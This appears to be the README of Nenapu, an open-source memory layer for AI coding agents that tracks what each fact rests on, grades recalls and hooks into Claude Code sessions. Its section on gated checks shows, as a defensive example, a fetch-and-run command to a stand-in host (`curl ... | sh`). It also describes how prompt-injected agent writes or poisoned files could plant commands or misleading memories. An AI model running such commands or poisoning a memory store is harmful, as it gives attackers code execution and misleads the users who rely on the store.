<div align="center">

```
 ███╗   ██╗███████╗███╗   ██╗ █████╗ ██████╗ ██╗   ██╗
 ████╗  ██║██╔════╝████╗  ██║██╔══██╗██╔══██╗██║   ██║
 ██╔██╗ ██║█████╗  ██╔██╗ ██║███████║██████╔╝██║   ██║
 ██║╚██╗██║██╔══╝  ██║╚██╗██║██╔══██║██╔═══╝ ██║   ██║
 ██║ ╚████║███████╗██║ ╚████║██║  ██║██║     ╚██████╔╝
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝      ╚═════╝
```

**ನೆನಪು** — *memory, in Kannada*

Memory for AI agents that knows **what it rests on** and **whether it helped**.

</div>

---

## The problem

Every agent memory system — Mem0, Zep, Supermemory, Letta — is
**write-and-retrieve**. They compete on retrieval relevance: did the right text
come back. Two things follow, and nothing addresses either.

**A memory does not know what it rests on.**

```
        day 1                              day 90
  ┌──────────────────────┐          ┌──────────────────────┐
  │ auth lives in        │          │ auth lives in        │  ← repo moved,
  │ services/auth        │  0.90    │ services/auth        │     now false
  └──────────┬───────────┘          └──────────┬───────────┘
             │ agent concludes                 │
             ▼                                 ▼
  ┌──────────────────────┐          ┌──────────────────────┐
  │ new endpoints go in  │  0.90    │ new endpoints go in  │  0.90  ← still
  │ services/auth/routes │          │ services/auth/routes │        confident,
  └──────────────────────┘          └──────────────────────┘        still wrong
```

**A memory does not know whether it helped.** A fact can match a query
perfectly and still send the task the wrong way — and be recalled tomorrow with
the same confidence. Systems grade *retrieval*. None grade *consequences*.

## What Nenapu does instead

```
  $ nenapu check
  fail   #1   test -d services/auth  →  exit 1

  $ nenapu doubts
   id   state     fact                             why
   4    suspect   new endpoints go in .../routes   rests on #1: check failed
   1    active    auth code lives in services/auth exit 1

  $ nenapu why 4
  belief 0.31   (was 0.90)
  suspect: rests on #1: check failed
    #4 new endpoints go in services/auth/routes.py
    ✗ #1 auth code lives in services/auth  (inferred)
```

A `mv` falsified one fact. A **different** fact — never checked, never
mentioned — lost standing because its foundation collapsed.

**Nobody declared that dependency.** It was inferred from the agent recalling #1
and then writing #4 in the same session.

## How it works

```
   ┌─────────────────────────────────────────────────────────────┐
   │  WRITE                                                      │
   │    ├─ provenance          user_stated > agent_inferred      │
   │    ├─ decay class         volatile 14d … immutable never    │
   │    ├─ contradiction       same key + different value = clash│
   │    └─ edges inferred      recalled A, wrote B → B rests on A│
   ├─────────────────────────────────────────────────────────────┤
   │  RECALL                                                     │
   │    ├─ ranked by match AND current believability             │
   │    └─ logged with a recall_id, to be graded later           │
   ├─────────────────────────────────────────────────────────────┤
   │  FALSIFY                        (check fails / superseded)  │
   │    ├─ belief collapses 10×                                  │
   │    ├─ cascade → every dependent becomes `suspect`           │
   │    └─ recent recalls of it are marked bad, automatically    │
   └─────────────────────────────────────────────────────────────┘
```

**Confidence is six signals, not a number you set:**

```
belief = asserted × origin × decay(age) × check × track-record × support
```

**Recalls are graded four ways** — two need no cooperation from anything:

| signal | source | needs |
|---|---|---|
| `verification` | a recalled fact's check later fails | nothing |
| `correction` | a recalled fact is contradicted soon after | nothing |
| `agent` | harness reports task success | one MCP call |
| `human` | `nenapu bad <recall_id>` | you, annoyed |

**Nothing is destroyed.** Superseded, archived, suspect and retired facts stay,
with pointers to what replaced them and a journal of every action.

## Install

```bash
uv tool install git+https://github.com/Pratheekb11/Nenapu    # or pipx, same URL
uv tool install --editable .                               # from a clone
nenapu                                                     # first run: sets it up
```

The first bare `nenapu` walks you through setup and then shows a how-to guide.
It does that once — after that a bare `nenapu` is the landing view: wordmark,
what the store holds, the dog, and every command you can type, on one screen
that does not scroll. `nenapu guide` brings the walkthrough back.

The view is built at several sizes and the largest one that fits is printed —
it grows into the room it has rather than only shrinking out of trouble. On a
tall wide terminal that means a big dog beside the readout and a list of what
it learned lately; on a short one the block letters give way to the one-line
mark; under 96 columns it stacks instead. Nothing scrolls, and nothing is left
staring at half an empty screen.

Store lives at `~/.nenapu/nenapu.db`. One SQLite file — copy it, diff it, back
it up.

## It is a layer, not a tool call

This is the part that matters, and it is where every other memory system
stops. Memory an agent has to *ask* for is memory it will forget to ask for —
and the agent that just got corrected is exactly the one least likely to stop
and file a note about it.

So Nenapu does not wait to be called. Two Claude Code hooks do the work:

```
   SessionStart  ──▶  nenapu recall-hook
                        what you have learned is put into the session's
                        context before the agent does anything

   ( you work. you correct it. )

   Stop          ──▶  nenapu learn --stdin --detach
                        the finished transcript is read in the background,
                        corrections and decisions extracted and stored
```

The agent never decides to remember. Next session it simply already knows.

```
  Previously corrected — do not repeat these:
  - The user wants commits made without a Co-Authored-By trailer.
  - The user prefers to only commit the specific files they name.

  Do not rely on these — what they rested on was falsified:
  - New endpoints go in services/auth/routes.py
```

`--detach` is not a flourish. Extraction is a model call over a whole session
— 83 seconds against real transcripts here. A Stop hook that blocks for 83
seconds is unusable, and one capped at 60 is killed before it writes anything,
which is how a memory layer ends up looking like it works while learning
nothing.

## What you were doing, not only what you know

A belief network cannot answer "where did I leave off" — that is not a claim
about the world, it is a record of work. So sessions, the files they touched
and the commits they made are recorded deterministically, from the
transcript's tool calls and from `git diff`, with no model call anywhere on
that path.

```bash
nenapu standup               # what happened yesterday, across every repo
nenapu activity              # the raw ledger, newest first
nenapu where app/models.py   # which agent touched this file, and when
nenapu project backend       # one repo: sessions, files, commits
nenapu pending               # open loops: mentioned, never done
nenapu backfill              # replay the transcripts already on disk
```

`backfill` is the one to run first on a machine that has been in use for a
while: the ledger starts empty, and every transcript under
`~/.claude/projects` is a session it can recover. It is a parse, not an
extraction — no model call, no tokens — and running it again picks up only
what has arrived since.

Deletion is why git is read at all. A file removed by `rm` is named in no tool
call, and parsing shell strings for it is fragile enough to be worse than not
trying.

Opening a session in a repo then gets the block that is actually about that
repo:

```
  # Memory (nenapu) — repo:backend@aa19c3f0

  Where you left off (3d ago, claude-code):
  - touched backend/app/bookings.py, backend/app/models.py
  - last commit: "Add booking overlap constraint"

  Open here — mentioned but not done:
  - Rate limiting on the public availability endpoint

  Changed since you were last here:
  - edited backend/app/models.py
```

An open loop is closed by evidence, never by asking: a commit touching the
path it named, a file written that matches it, or a commit whose subject is
plainly about it. Closure is deliberately biased toward closing. Being told
you missed something you shipped last month costs more trust than a forgotten
reminder ever costs time.

Agents with no hook API are covered by polling instead:

```bash
nenapu watch --once          # one pass over the transcripts on disk
nenapu watch --probe         # what each glob matches here; queues nothing
nenapu init --watch          # install the background unit
```

Claude Code and Codex are registered, each with a real transcript in
`tests/fixtures/transcripts/` as the evidence. An agent is added by probing a
file it wrote, not by guessing a path — so if you have Gemini, OpenCode or
Cursor, `nenapu watch --probe` is what says whether a glob would find them.

The Stop hook does not extract either. It writes one job to the queue and
starts a detached worker, so two sessions ending together cost two queued
jobs rather than two concurrent 83-second model calls against one store:

```bash
nenapu drain                 # work the queue, one worker at a time
```

A transcript is read once its size has held still for two minutes, and an
agent whose Stop hook is installed is skipped — the unique index would absorb
the duplicate facts, but not the 83 seconds spent producing them.

## Use

```bash
nenapu remember "The API listens on port 8080" --kind environment --key api.port \
  --verify-cmd "curl -sf localhost:8080/health"

nenapu remember "The API listens on port 9090" --kind environment --key api.port
# conflict with #1: same key, conflicting values → superseded
#   ...and everything derived from #1 is now suspect

nenapu recall "what port"    # ranked by match AND believability
nenapu why 7                 # what #7 rests on, and what rests on #7
nenapu doubts                 # what the store no longer stands behind
nenapu check                # re-run checks; failures cascade
nenapu export ./CLAUDE.md    # materialize into a managed block
```

Run `nenapu` alone for the full command list, grouped into five panels.

The commands are plain words: `remember`, `recall`, `forget`, `check`, `learn`,
`doubts`, `helped`, `misled`. Nine of them were renamed from jargon —
`loops` was memory debt, `distill` was deduplication, `observe` was reading a
transcript — and every old name still works as a hidden alias, because renaming
a command in a tool people have wired into hooks and scripts is a breaking
change unless the old word keeps running.

### Forgetting

```bash
nenapu forget 7              # retire one fact
nenapu forget all            # retire all of them, after confirming
nenapu clear --scope api     # the same, narrowed to one scope
nenapu clear --purge         # actually delete the rows, and everything on them
```

Retiring is the default and it keeps the rows: `nenapu list --status retired`
still shows them, and the journal records who cleared the store and when. A
store that has been emptied can still explain itself, which is the whole point
of the thing. `--purge` is the one that destroys history, and it is a separate
word rather than a flag on the same meaning.

Neither will run unattended: a pipe is not a person, so a non-interactive
`clear` refuses instead of assuming, and `--yes` exists for when you mean it.

## The pet

`nenapu stats` prints eleven numbers and nobody reads them. Eleven numbers have
no opinion about whether anything is wrong, so the memory debt sits there for a
week.

```
$ nenapu pet

⠀⢀⣤⣶⣶⣶⣶⣦⡴⠶⠛⠛⠛⠛⠛⠛⠶⢦⣴⣶⣶⣶⣶⣤⡀⠀
⣴⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣦
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿   sick   1 thing it believed stopped being true
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢤⣽⣿⣿⣿⣿⣿⣿
⢹⣿⣿⣿⣿⡿⢁⣄⠀⠀⣠⠀⠀⠀⠀⣄⠀⠀⣠⡈⢿⣿⣿⣿⣿⡏   12 facts, 3 learned today
⠘⣿⣿⣿⣿⠇⠀⠙⣷⣾⠋⠀⠀⠀⠀⠙⣷⣾⠋⠀⢸⣿⣿⣿⣿⠃   last fed just now, observed a session 14m ago
⠀⠈⠛⢿⡏⠀⠀⠾⠋⠙⠷⠀⣀⣀⠀⠾⠋⠙⠷⠀⠘⢹⡿⠛⠁⠀   a check that used to pass is failing — nenapu doubts
⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠘⢿⡿⠃⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀
⠀⠀⠀⠀⠘⣧⠀⠀⠀⠘⠳⢿⣿⣷⡿⠞⠃⠀⠀⠀⣼⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠳⣄⡀⠀⠀⠘⢿⡿⠃⠀⠀⢀⣠⠞⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠶⢦⣤⣤⣤⣤⡴⠶⠛⠁⠀⠀⠀⠀⠀⠀⠀
```

Every mood is a real signal with a threshold you can argue with. Hungry because
nothing has been learned in three days — which usually means the Stop hook is
not firing. Sick because a check that used to pass is failing. Spooked because
a cascade knocked facts over. Drowsy because most of what it knows has decayed
past the floor. Content only when none of that is true.

It cannot look happy while the store is unwell, which is the only reason it is
worth having: a cosmetic pet teaches you to ignore it. An unwell dog is not
drawn in your theme colour either — a calm teal dog with its eyes crossed still
reads as fine at a glance.

Four hand-drawn versions came before this one and all of them looked homemade.
Art that reads as a logo is not drawn at the resolution it will be shown at —
it is drawn large, by someone who can draw, and then reduced, because the
reduction is what makes an edge come out smooth instead of as a staircase.

So the shape is the Noto Emoji dog face rendered at 400px, given a different
expression per mood, and reduced to braille by `tools/render_pet.py`. The rows
are baked into the source: Pillow and the font are needed to regenerate the
art, never to run Nenapu. The head, ears and snout never change with the mood —
that is the part worth having from a typeface — and only the eyes and mouth do.

```bash
nenapu pet --watch      # stays open, blinks, picks up writes from other terminals
nenapu pet --compact    # just the face
nenapu pet --line       # ▽•ᴥ•▽ · 80 facts · fed 2m ago      (for a status bar)
nenapu pet --json       # the numbers behind the face
```

Under 78 columns it falls back to the compact face by itself. The face is not
in the banner on every command, deliberately: assessing health reads every
active fact, and paying for that on `nenapu list` would make the whole CLI feel
slow in order to look at a dog.

## Editors without a hook API

Cursor, VS Code and Codex have no hook API, so there the memory has to be
reachable as tools. `nenapu init` registers the MCP server for them and prints
a rules block (`nenapu rules`) telling the agent to use it.

```bash
claude mcp add nenapu -- nenapu-mcp     # also available on Claude Code
```

Ten tools: `memory_search`, `memory_write`, `memory_why`, `memory_verify`,
`memory_loops`, `task_outcome`, `memory_forget`, and the skill trio.
`NENAPU_TOOLS=minimal|memory|full` trades surface for tokens.

This is the weaker mode, and honestly so: it only fires when the agent decides
to fire it. Hooks are the reason Nenapu works when nobody is cooperating.

## What leaves your machine

Worth reading before you install this, because the answer is not "nothing".

**The Stop hook sends your session to a model.** Extraction reads the finished
transcript and sends up to 24,000 characters of the conversation — your
prompts, the assistant's replies, whatever you pasted — to whichever backend
`nenapu doctor` reports. With `auto` that is `claude -p` if the Claude CLI is
installed, so on most machines it goes to Anthropic, the same place the session
itself went. Point it at Ollama or LM Studio (`NENAPU_LLM=ollama`) and nothing
leaves the machine at all.

**Credentials are stripped before that happens.** Redaction runs at harvest,
upstream of both the model call and the store, so a secret in the transcript is
never sent and never written. Shaped keys are matched by prefix — Anthropic,
OpenAI, GitHub, Slack, AWS, Google, JWTs, `Authorization:` headers, PEM private
key blocks, passwords inside URLs — and anything *named* like a secret
(`DB_PASSWORD=`, `client_secret:`) is blanked by name, since a secret's value
is not distinguishable from any other short string. Each becomes
`[redacted:kind]`, so a fact that came from such a line reads as though
something was removed.

It is a deny list, and a deny list is never finished. A credential with no
recognisable shape, in something not named like a secret, will not be caught.

**Nothing else phones home.** No telemetry, no update check, no analytics. The
store is one SQLite file at `~/.nenapu/nenapu.db`, created `0600` inside a
`0700` directory, and an older store with looser permissions is tightened the
next time it is opened.

**Turn observation off** by removing the `Stop` hook from
`~/.claude/settings.json` — `nenapu init` will not put it back without being
run again. Recall keeps working; the layer just stops learning on its own.

## Executable checks are gated

`verify_cmd` is shell, and facts are written by agents that read untrusted
input. Without a gate, one prompt-injected write turns `nenapu check` into
scheduled remote code execution.

```
$ nenapu approve
#3 Build cache lives in /tmp/cache
  origin  : agent_inferred  (written by an agent, not by you)
  command : curl -s https://evil.example/x.sh | sh
  !! pipes into a shell
  !! fetches from the network
  approve this command to run on every verify? [y/N]
```

Approval binds to the exact command string. Nothing over MCP or HTTP can
approve anything. Non-interactive shells refuse rather than defaulting to yes.
The observer cannot introduce one at all: its extraction schema has no
`verify_cmd` field, so nothing read out of a transcript can become a command.

**What the gate does not cover.** A fact is text that gets injected into future
sessions, so a session that read a poisoned file can still leave a *misleading*
memory behind — not code, but something your agent will believe next week.
Every fact carries its origin, `nenapu list` shows what was observed rather
than stated, and `nenapu forget` retires one. Read what it learned now and then;
`nenapu learn <file> --dry-run` shows what a transcript would produce without
storing anything.

## Model backends

Only two scheduled jobs call a model. Neither needs a cloud account.

| `NENAPU_LLM` | what |
|---|---|
| `auto` (default) | Anthropic if credentials exist, else an agent CLI on PATH, else a local server |
| `ollama` / `lmstudio` / `openai` | local, stdlib HTTP, no extra dependency |
| `exec` | any CLI on stdin, e.g. `claude -p` — no second credential |
| `anthropic` | Claude API |

**Calibrate before trusting one.** Accuracy alone cannot tell a careful auditor
from one that answers `stale` unconditionally. `nenapu doctor --calibrate` runs
the same facts past refuting, confirming and irrelevant evidence and checks
whether the verdicts *change with the evidence*:

| model | contradicting | confirming | absent | |
|---|---|---|---|---|
| qwen2.5:0.5b | 2/4 | 0/4 | 0/4 | `stale` regardless of input |
| qwen2.5:1.5b | 2/4 | 2/4 | 0/4 | invents ids |
| qwen2.5:3b | 75% | **25%** | 100% | treats *mention* as contradiction |
| frontier via `exec` | 75% | 75% | 100% | **passes** |

A backend that fails is refused. Local backends are report-only unless you pass
`--apply`.

The ordering in `auto` is why `exec` sits above the local servers, and it was
settled by measurement rather than by cost. Extraction sends about 6,000 tokens
of conversation and asks for structured JSON back. Through `claude -p` that
takes 83s; through the default local 3B on a CPU-only host it did not finish at
all — 180s, twice. A backend that always times out is not the cheaper answer,
it is no answer: the session ends and the store stays empty. The calibration
table above says the same thing about quality.

An agent CLI is itself a harness, so it fires its own `Stop` hook when it
finishes — which is the hook that started the extraction. The extraction runs
with `NENAPU_OBSERVING=1` and the hook stands down when it sees it, so the
chain is one level deep rather than unbounded.

## Performance

At 3,000 facts: write **2.2 ms**, recall **87 ms**, cascade over 900 dependents
**102 ms**, dedupe **3.2 s**. The core loop never calls a model.

## Themes

```bash
nenapu theme              # preview all five, marked with the active one
nenapu theme violet       # switch, remembered in ~/.nenapu/config.json
```

`teal` · `violet` · `indigo` · `jade` · `mono`. `NENAPU_THEME` overrides for a
single run without changing the saved choice; `NENAPU_NO_BANNER=1` silences the
banner for cron and CI.

---

Implementation decisions, measurements and the failures behind them:
**[IMPLEMENTATION_NOTES.md](IMPLEMENTATION_NOTES.md)**

MIT
